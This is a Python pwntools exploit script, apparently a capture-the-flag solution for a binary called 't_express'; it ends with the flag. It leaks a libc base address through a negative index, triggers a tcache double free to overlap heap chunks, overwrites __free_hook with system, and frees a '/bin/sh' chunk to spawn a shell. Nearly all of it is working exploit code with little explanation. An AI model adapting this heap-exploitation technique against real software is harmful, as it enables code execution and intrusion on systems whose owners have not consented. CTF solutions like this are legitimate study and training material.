from pwn import *

context.log_level = 'debug'
e = ELF('./t_express')
p = process('./t_express')
libc = e.libc

passes = 0x0000000000202060

'''
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled

struct pass5
{
  char firstname[8];
  char lastname[8];
  unsigned __int64 ticket_type;
  unsigned int meal_ticket;
  unsigned int safari_pass;
  unsigned int giftshop_coupon;
  unsigned __int64 ride_count;
};
'''

def buy(c,f,l):
	p.sendafter(':','1')
	p.sendafter(':',str(c)) # 1 or 2
	p.sendafter(':',f) # first name
	p.sendafter(':',l) # last name

def view(idx):
	p.sendafter(':','2')
	p.sendafter(':',str(idx))

def use(idx,chk=None):
    p.sendafter(':','3')
    p.sendafter(':',str(idx))
    if chk:
        p.sendafter(':',str(chk))

view(-4)
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - (libc.symbols['_IO_2_1_stderr_'] + 131)
log.info('libc_base : ' + hex(libc_base))

buy(1,'A'*8,'B'*8) # 0
buy(2,'A'*8,'B'*8) # 1
buy(1,'C','C') # 2

use(2)

use(1,1)
use(1,1)
use(1,1)
use(1,2)
use(1,3)

# Way1 -> overlap chunk (DFB)
for i in range(0x20):
    use(0,1)
use(1,1)

# Way2 -> overlap chunk (DFB)
# use(0,4)
# use(1,4)
# use(0,4)
# use(1,4)

buy(2,p64(libc_base + libc.symbols['__free_hook']),'A') # 3
buy(1,'/bin/sh\x00','A') # 4
buy(1,p64(libc_base + libc.symbols['system']),'A') # 5

use(4) # system("/bin/sh\x00");

p.interactive()

# SCTF{D1d_y0u_$ee_7he_7c4che_key}
